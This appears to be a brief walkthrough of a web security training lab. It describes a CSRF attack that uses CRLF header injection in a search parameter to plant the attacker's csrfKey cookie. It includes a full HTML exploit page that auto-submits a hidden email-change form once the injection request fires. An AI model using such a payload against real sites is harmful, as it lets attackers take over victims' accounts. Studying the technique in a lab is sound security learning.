To perform the email changing we need to have a valid csrfkey and a valid csrf token
we have seen that if we craft /?search=test%0d%0aSet-Cookie:%20csrfKey=KEY_TO_SET%3b%20SameSite=None we are able to set the csrf key in the browser cookies

So what we need is to force the victim to fetch this crafted search where we insert our wiener VALID csrfKey and at the same time to force him to use the csrf we can find in the valid wiener email change form
So what we can do is



<html>
    <body>
        <form action="https://0a1e0011043e8196804da83600de00f5.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="exploit@evil-user.net" />
            <!--- here we are using a valid csrf (from wiener session --->
            <input type="hidden" name="csrf" value="AJn5f9cvliHVcyvNQUfnzoPhsIzDFSBG" />
        </form>

       <!--- here we are setting the wiener csrfkey in the victim browser --->
     <img src="https://0a1e0011043e8196804da83600de00f5.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=z9ZokWSagYgx16ntApPShWAunrEUdbLO%3b%20SameSite=None" onerror="document.forms[0].submit()">

    </body>
</html>
